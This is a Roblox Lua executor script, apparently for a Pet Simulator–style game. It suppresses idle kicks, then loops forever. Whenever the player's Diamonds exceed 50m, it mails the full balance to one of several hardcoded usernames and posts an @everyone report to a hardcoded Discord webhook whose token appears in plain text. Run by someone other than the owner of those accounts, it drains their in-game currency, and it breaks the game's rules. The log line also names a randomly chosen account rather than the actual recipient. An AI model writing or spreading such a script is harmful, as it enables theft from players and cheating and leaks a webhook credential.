getgenv().Setting = {
    ["Account Send"] = { "PopeSnail2801", "repay_4bx", "untru6ci" },
    ["Min Gem To Send"] = "50m",
    ["Url Webhook"] =
    "https://discord.com/api/webhooks/1336358658791051427/e7AlUb4LPd-Nee9xYoCoY2TFza_lhXIVYqhOzs7p0N8XfnFLPeW1hV54LgfAdlvNaHK-",
}
getgenv().data = {
    ["2m"] = "1k",
}

repeat
    wait()
until game:IsLoaded() and game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui") and game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("GUIFX Holder") and
    game:GetService("Players").LocalPlayer.PlayerGui["GUIFX Holder"].DisplayOrder == 999
local rs = game:GetService("ReplicatedStorage")
local save = require(rs.Library.Client.Save)
local Items = require(game:GetService("ReplicatedStorage").Library.Items.Types)
local plr = game.Players.LocalPlayer
local RAP = 0
local a = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)

local VirtualUser = game:service "VirtualUser"
game:service("Players").LocalPlayer.Idled:connect(
    function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end
)
local savepet = {}
local v0 = {
    k = "e3",
    m = "e6",
    b = "e9",
    t = "e12",
    q = "e15"
};
ParseNumberSmart = function(v1)
    if type(v1) == "string" then
        v1 = v1:gsub("[,%s%c%z]", "");
        if #v1 > 0 then
            local v2 = v0[v1:sub(#v1):lower()];
            if v2 then
                v1 = v1:sub(1, #v1 - 1) .. v2;
            end;
        end;
    end;
    return (tonumber(v1));
end;
function formatNumber(v)
    return tostring(v):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

local function loggem(user, gem)
    local Message = {
        ['username'] = "Pet GO Log",
        ["content"] = "@everyone\nUserName: " .. user .. "\nSend Done: " .. gem

    }
    local DataCallBack = request({
        Url = getgenv().Setting["Url Webhook"],
        Method = 'POST',
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(Message)
    })
end

spawn(function()
    while wait() do
        for i, v in pairs(save.Get().Inventory.Currency) do
            if v.id == "Diamonds" and v._am >= ParseNumberSmart(getgenv().Setting["Min Gem To Send"]) then
                local args = {
                    [1] = getgenv().Setting["Account Send"][math.random(1, #getgenv().Setting["Account Send"])],
                    [2] = "Send Gem",
                    [3] = "Currency",
                    [4] = tostring(i),
                    [5] = v._am
                }
                if game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
                    :InvokeServer(
                        unpack(args)) then
                    loggem(getgenv().Setting["Account Send"][math.random(1, #getgenv().Setting["Account Send"])],
                        formatNumber(v._am))
                end
            end
        end
    end
end)
